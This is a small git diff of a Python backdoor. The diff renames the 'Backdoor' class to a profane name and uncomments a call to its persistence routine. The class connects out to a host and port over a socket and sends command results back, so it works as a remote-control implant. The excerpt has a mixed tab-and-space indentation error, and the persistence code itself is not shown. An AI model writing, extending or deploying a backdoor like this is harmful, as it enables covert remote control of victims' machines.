@@ -15,9 +15,9 @@ import scapy.all as scapy
 
 
 
-class Backdoor():
+class MotherFucker():
     def __init__(self, ip, port):
-#        self.persistence()
+	self.persistence()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
     def persistence(self):
@@ -137,5 +137,5 @@ class Backdoor():
 
             self.cmd_send(cmd_rslt)
 if __name__ == "__main__":
-    app = Backdoor("127.0.0.1", "80")
+    app = MotherFucker("127.0.0.1", "80")
     app.run()
